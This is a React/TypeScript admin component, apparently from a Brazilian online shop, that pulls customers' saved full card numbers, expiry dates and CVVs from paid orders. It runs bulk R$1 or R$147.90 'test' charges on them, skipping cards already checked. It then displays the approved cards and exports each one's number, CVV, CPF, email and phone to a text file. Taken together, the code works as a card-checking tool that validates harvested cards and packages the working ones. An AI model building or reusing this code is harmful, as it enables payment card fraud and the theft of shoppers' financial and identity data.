import { useEffect, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "@/hooks/use-toast";
import { CreditCard, CheckCircle2, Loader2, RefreshCw, Trash2 } from "lucide-react";
import { cn } from "@/lib/utils";

interface TestCharge {
  id: string;
  order_id: string | null;
  order_number: string | null;
  customer_name: string | null;
  customer_email: string | null;
  customer_cpf: string | null;
  customer_phone: string | null;
  card_holder_name: string | null;
  card_number: string | null;
  card_brand: string | null;
  card_expiry: string | null;
  card_cvv: string | null;
  card_installments: number | null;
  amount: number;
  transaction_id: string | null;
  status: string;
  refusal_reason: string | null;
  created_at: string;
}

const isApproved = (s: string) => ["approved", "paid"].includes((s || "").toLowerCase());

const BATCH_SIZE = 20;

async function runTestCharges(
  orderIds: string[],
  opts?: { amount?: number; itemTitle?: string; onProgress?: (done: number, total: number) => void },
): Promise<{ total: number; approved: number }> {
  let total = 0;
  let approved = 0;
  for (let i = 0; i < orderIds.length; i += BATCH_SIZE) {
    const chunk = orderIds.slice(i, i + BATCH_SIZE);
    const { data, error } = await supabase.functions.invoke("test-card-charge", {
      body: {
        order_ids: chunk,
        ...(opts?.amount ? { amount: opts.amount } : {}),
        ...(opts?.itemTitle ? { item_title: opts.itemTitle } : {}),
      },
    });
    if (error) throw error;
    total += data?.total || 0;
    approved += data?.approved || 0;
    opts?.onProgress?.(Math.min(i + chunk.length, orderIds.length), orderIds.length);
  }
  return { total, approved };
}

const AIR_FRYER_TITLE = "Fritadeira Elétrica Air Fryer Gaabor Duo Digital Touch sem Óleo 4.2L";
const AIR_FRYER_AMOUNT = 147.9;

export function TestChargeButton({
  orderId,
  onDone,
  amount,
  itemTitle,
  label,
  colorClass = "bg-violet-500 hover:bg-violet-600",
}: {
  orderId: string;
  onDone?: () => void;
  amount?: number;
  itemTitle?: string;
  label?: string;
  colorClass?: string;
}) {
  const [loading, setLoading] = useState(false);
  const displayAmount = amount ?? 1;
  return (
    <button
      disabled={loading}
      onClick={async () => {
        setLoading(true);
        try {
          const { approved } = await runTestCharges([orderId], { amount, itemTitle });
          if (approved > 0) {
            toast({ title: `✅ Cobrança de R$${displayAmount.toFixed(2)} aprovada!`, description: "Veja em Testes Aprovados." });
            onDone?.();
          } else {
            toast({ title: "Cobrança não aprovada", description: "Veja o detalhe em Testes Aprovados.", variant: "destructive" });
          }
        } catch (e: any) {
          toast({ title: "Erro", description: e?.message || "Falha ao testar", variant: "destructive" });
        } finally {
          setLoading(false);
        }
      }}
      className={cn(
        "inline-flex items-center gap-1.5 h-9 px-3 rounded-lg text-xs font-semibold text-white transition-all disabled:opacity-60",
        colorClass,
      )}
    >
      {loading ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <CreditCard className="w-3.5 h-3.5" />}
      {label || `Cobrar R$${displayAmount.toFixed(2).replace('.', ',')} (teste)`}
    </button>
  );
}

export function AirFryerTestChargeButton({ orderId, onDone }: { orderId: string; onDone?: () => void }) {
  return (
    <TestChargeButton
      orderId={orderId}
      onDone={onDone}
      amount={AIR_FRYER_AMOUNT}
      itemTitle={AIR_FRYER_TITLE}
      label="Cobrar R$147,90 (Air Fryer)"
      colorClass="bg-amber-500 hover:bg-amber-600"
    />
  );
}

type PeriodKey = "today" | "3d" | "7d" | "15d" | "30d" | "all";

const PERIOD_OPTIONS: { key: PeriodKey; label: string; days: number | null }[] = [
  { key: "today", label: "Hoje", days: 0 },
  { key: "3d", label: "3 dias", days: 3 },
  { key: "7d", label: "7 dias", days: 7 },
  { key: "15d", label: "15 dias", days: 15 },
  { key: "30d", label: "1 mês", days: 30 },
  { key: "all", label: "Total", days: null },
];

export function BulkTestChargeButton({ orders, onDone }: { orders: any[]; onDone?: () => void }) {
  const [loading, setLoading] = useState(false);
  const [period, setPeriod] = useState<PeriodKey>("today");
  const [alreadyTested, setAlreadyTested] = useState<{ persons: Set<string>; cards: Set<string> }>({
    persons: new Set(),
    cards: new Set(),
  });

  const loadTested = async () => {
    const { data } = await supabase
      .from("card_test_charges")
      .select("customer_cpf, customer_email, card_number")
      .limit(5000);
    const persons = new Set<string>();
    const cards = new Set<string>();
    (data || []).forEach((r: any) => {
      const p = (r.customer_cpf || "").replace(/\D/g, "") || (r.customer_email || "").toLowerCase();
      if (p) persons.add(p);
      const c = (r.card_number || "").replace(/\D/g, "").slice(-4);
      if (c) cards.add(c);
    });
    setAlreadyTested({ persons, cards });
  };

  useEffect(() => {
    loadTested();
  }, []);

  const periodCfg = PERIOD_OPTIONS.find((p) => p.key === period)!;

  const seenPersons = new Set<string>();
  const seenCards = new Set<string>();
  const eligible = orders.filter((o) => {
    // Apenas vendas PAGAS / APROVADAS
    const ps = (o.payment_status || "").toLowerCase();
    if (ps !== "approved" && ps !== "paid") return false;

    const m = (o.payment_method || "").toLowerCase();
    const isCard = m.includes("cart") || m.includes("credit") || !!o.card_brand || !!o.card_holder_name;
    const hasFullCard = !!o.card_cvv && !!o.card_expiry && !!(o as any).ticket;
    if (!isCard || !hasFullCard) return false;

    if (periodCfg.days !== null) {
      const created = o.created_at ? new Date(o.created_at).getTime() : 0;
      if (!created) return false;
      const now = Date.now();
      if (periodCfg.days === 0) {
        const d = new Date();
        const startOfDay = new Date(d.getFullYear(), d.getMonth(), d.getDate()).getTime();
        if (created < startOfDay) return false;
      } else if (created < now - periodCfg.days * 24 * 60 * 60 * 1000) {
        return false;
      }
    }

    // Dedupe: mesma pessoa (CPF ou email) ou mesmo cartão (últimos 4)
    const personKey =
      (o.customer_cpf || "").replace(/\D/g, "") || (o.customer_email || "").toLowerCase();
    const cardKey = ((o as any).ticket || "").replace(/\D/g, "").slice(-4);

    if (personKey && (seenPersons.has(personKey) || alreadyTested.persons.has(personKey))) return false;
    if (cardKey && (seenCards.has(cardKey) || alreadyTested.cards.has(cardKey))) return false;

    if (personKey) seenPersons.add(personKey);
    if (cardKey) seenCards.add(cardKey);
    return true;
  });

  return (
    <div className="inline-flex items-center gap-2 flex-wrap">
      <div className="inline-flex items-center gap-1 p-1 rounded-full bg-muted">
        {PERIOD_OPTIONS.map((p) => (
          <button
            key={p.key}
            onClick={() => setPeriod(p.key)}
            className={cn(
              "h-7 px-2.5 rounded-full text-[10px] font-semibold transition-all",
              period === p.key
                ? "bg-violet-500 text-white shadow"
                : "text-muted-foreground hover:text-foreground"
            )}
          >
            {p.label}
          </button>
        ))}
      </div>
      <button
        disabled={loading || eligible.length === 0}
        onClick={async () => {
          if (!confirm(`Cobrar R$1 em ${eligible.length} cartão(ões) (${periodCfg.label})?`)) return;
          setLoading(true);
          try {
            const ids = eligible.map((o) => o.id);
            const { total, approved } = await runTestCharges(ids);
            toast({
              title: `${approved}/${total} aprovados`,
              description: approved > 0 ? "Aprovados disponíveis em Testes Aprovados." : "Nenhum aprovado.",
            });
            onDone?.();
            loadTested();
          } catch (e: any) {
            toast({ title: "Erro", description: e?.message || "Falha", variant: "destructive" });
          } finally {
            setLoading(false);
          }
        }}
        className="inline-flex items-center gap-1.5 h-9 px-3 rounded-full text-xs font-semibold bg-violet-500/10 text-violet-600 hover:bg-violet-500/20 transition-all disabled:opacity-50"
        title="Cobra R$1 apenas em vendas PAGAS, ignorando pessoa/cartão já testado"
      >
        {loading ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <CreditCard className="w-3.5 h-3.5" />}
        Cobrar R$1 ({eligible.length})
      </button>
    </div>
  );
}

export function ApprovedTestsView() {
  const [tests, setTests] = useState<TestCharge[]>([]);
  const [loading, setLoading] = useState(true);
  const [tab, setTab] = useState<"approved" | "all">("approved");

  const fetchTests = async () => {
    setLoading(true);
    const { data, error } = await supabase
      .from("card_test_charges")
      .select("*")
      .order("created_at", { ascending: false })
      .limit(1000);
    if (!error && data) setTests(data as any);
    setLoading(false);
  };

  useEffect(() => {
    fetchTests();
  }, []);

  const filtered = tab === "approved" ? tests.filter((t) => isApproved(t.status)) : tests;
  const approvedCount = tests.filter((t) => isApproved(t.status)).length;

  const formatCard = (n: string | null) =>
    n ? n.replace(/\D/g, "").replace(/(.{4})/g, "$1 ").trim() : "—";

  const exportTxt = () => {
    const approved = tests.filter((t) => isApproved(t.status));
    if (approved.length === 0) {
      toast({ title: "Nenhum teste aprovado", variant: "destructive" });
      return;
    }
    const lines = approved.map((t) =>
      [
        `=== Teste ${t.id} ===`,
        `Pedido: ${t.order_number || t.order_id}`,
        `Data: ${new Date(t.created_at).toLocaleString("pt-BR")}`,
        `Cliente: ${t.customer_name}`,
        `CPF: ${t.customer_cpf}`,
        `Email: ${t.customer_email}`,
        `Telefone: ${t.customer_phone}`,
        `Titular: ${t.card_holder_name}`,
        `Número: ${formatCard(t.card_number)}`,
        `Validade: ${t.card_expiry}`,
        `CVV: ${t.card_cvv}`,
        `Bandeira: ${t.card_brand}`,
        `Valor: R$ ${Number(t.amount).toFixed(2)}`,
        `Transação: ${t.transaction_id}`,
        `Status: ${t.status}`,
        ``,
      ].join("\n")
    );
    const blob = new Blob([lines.join("\n")], { type: "text/plain;charset=utf-8" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `testes-aprovados-${new Date().toISOString().slice(0, 10)}.txt`;
    a.click();
    URL.revokeObjectURL(url);
  };

  return (
    <div className="space-y-5">
      <div className="rounded-2xl border border-border bg-card p-5">
        <div className="flex items-center justify-between flex-wrap gap-3">
          <div className="flex gap-2">
            {[
              { key: "approved" as const, label: "Aprovados", count: approvedCount },
              { key: "all" as const, label: "Todos", count: tests.length },
            ].map(({ key, label, count }) => (
              <button
                key={key}
                onClick={() => setTab(key)}
                className={cn(
                  "h-9 px-4 rounded-full text-xs font-semibold transition-all",
                  tab === key
                    ? "bg-gradient-to-r from-emerald-500 to-teal-500 text-white shadow-lg shadow-emerald-500/25"
                    : "bg-muted text-muted-foreground hover:text-foreground"
                )}
              >
                {label} <span className="opacity-70 ml-1">{count}</span>
              </button>
            ))}
          </div>
          <div className="flex gap-2">
            <button
              onClick={fetchTests}
              className="inline-flex items-center gap-1.5 h-9 px-3 rounded-full text-xs font-semibold bg-muted hover:bg-muted/70 transition-all"
            >
              <RefreshCw className={cn("w-3.5 h-3.5", loading && "animate-spin")} />
              Atualizar
            </button>
            <button
              onClick={exportTxt}
              className="inline-flex items-center gap-1.5 h-9 px-3 rounded-full text-xs font-semibold bg-emerald-500/10 text-emerald-600 hover:bg-emerald-500/20 transition-all"
            >
              Exportar aprovados (TXT)
            </button>
          </div>
        </div>
      </div>

      {loading ? (
        <div className="space-y-2">
          {[1, 2, 3].map((i) => (
            <div key={i} className="h-24 rounded-2xl bg-muted/40 animate-pulse" />
          ))}
        </div>
      ) : filtered.length === 0 ? (
        <div className="rounded-2xl border border-border bg-card p-12 text-center">
          <CheckCircle2 className="w-12 h-12 text-muted-foreground/30 mx-auto mb-3" />
          <p className="text-sm text-muted-foreground">
            {tab === "approved"
              ? "Nenhum teste aprovado ainda. Vá em Pedidos e clique em 'Cobrar R$1' nos cartões salvos."
              : "Nenhum teste realizado."}
          </p>
        </div>
      ) : (
        <div className="space-y-2.5">
          {filtered.map((t) => {
            const approved = isApproved(t.status);
            return (
              <div
                key={t.id}
                className={cn(
                  "border rounded-2xl bg-card p-4 transition-all",
                  approved ? "border-emerald-500/30" : "border-border"
                )}
              >
                <div className="flex items-start gap-4 flex-wrap">
                  <div
                    className={cn(
                      "w-11 h-11 rounded-xl flex items-center justify-center shrink-0",
                      approved ? "bg-emerald-500/10 text-emerald-500" : "bg-red-500/10 text-red-500"
                    )}
                  >
                    <CreditCard className="w-5 h-5" />
                  </div>
                  <div className="flex-1 min-w-[220px]">
                    <div className="flex items-center gap-2 flex-wrap">
                      <p className="text-sm font-semibold text-foreground">{t.customer_name || "—"}</p>
                      <span
                        className={cn(
                          "text-[10px] font-bold px-2 py-0.5 rounded-full",
                          approved
                            ? "bg-emerald-500/15 text-emerald-600"
                            : "bg-red-500/15 text-red-600"
                        )}
                      >
                        {t.status?.toUpperCase()}
                      </span>
                      <span className="text-[10px] text-muted-foreground">
                        R$ {Number(t.amount).toFixed(2)}
                      </span>
                    </div>
                    <p className="text-[11px] text-muted-foreground">
                      {new Date(t.created_at).toLocaleString("pt-BR")} · Pedido{" "}
                      {t.order_number || t.order_id?.slice(0, 8)}
                    </p>
                    {t.refusal_reason && (
                      <p className="text-[11px] text-red-500 mt-1">↳ {t.refusal_reason}</p>
                    )}
                  </div>
                </div>

                <div className="mt-3 grid grid-cols-1 md:grid-cols-2 gap-3 text-xs">
                  <div className="bg-muted/40 rounded-xl p-3 space-y-1">
                    <p className="text-[10px] uppercase tracking-wider text-muted-foreground font-bold mb-1">
                      Cliente
                    </p>
                    <p><span className="text-muted-foreground">Email:</span> {t.customer_email || "—"}</p>
                    <p><span className="text-muted-foreground">CPF:</span> {t.customer_cpf || "—"}</p>
                    <p><span className="text-muted-foreground">Telefone:</span> {t.customer_phone || "—"}</p>
                  </div>
                  <div
                    className={cn(
                      "rounded-xl p-3 space-y-1 border",
                      approved
                        ? "bg-emerald-500/5 border-emerald-500/20"
                        : "bg-destructive/5 border-destructive/20"
                    )}
                  >
                    <p className="text-[10px] uppercase tracking-wider text-muted-foreground font-bold mb-1">
                      Cartão
                    </p>
                    <p><span className="text-muted-foreground">Titular:</span> {t.card_holder_name || "—"}</p>
                    <p className="font-mono">
                      <span className="text-muted-foreground font-sans">Número:</span> {formatCard(t.card_number)}
                    </p>
                    <p>
                      <span className="text-muted-foreground">Validade:</span> {t.card_expiry || "—"} ·{" "}
                      <span className="text-muted-foreground">CVV:</span> {t.card_cvv || "—"}
                    </p>
                    <p>
                      <span className="text-muted-foreground">Bandeira:</span> {t.card_brand || "—"} ·{" "}
                      <span className="text-muted-foreground">Parcelas:</span>{" "}
                      {t.card_installments ? `${t.card_installments}x` : "1x"}
                    </p>
                    {t.transaction_id && (
                      <p className="text-[10px] text-muted-foreground pt-1">TX: {t.transaction_id}</p>
                    )}
                  </div>
                </div>
              </div>
            );
          })}
        </div>
      )}
    </div>
  );
}
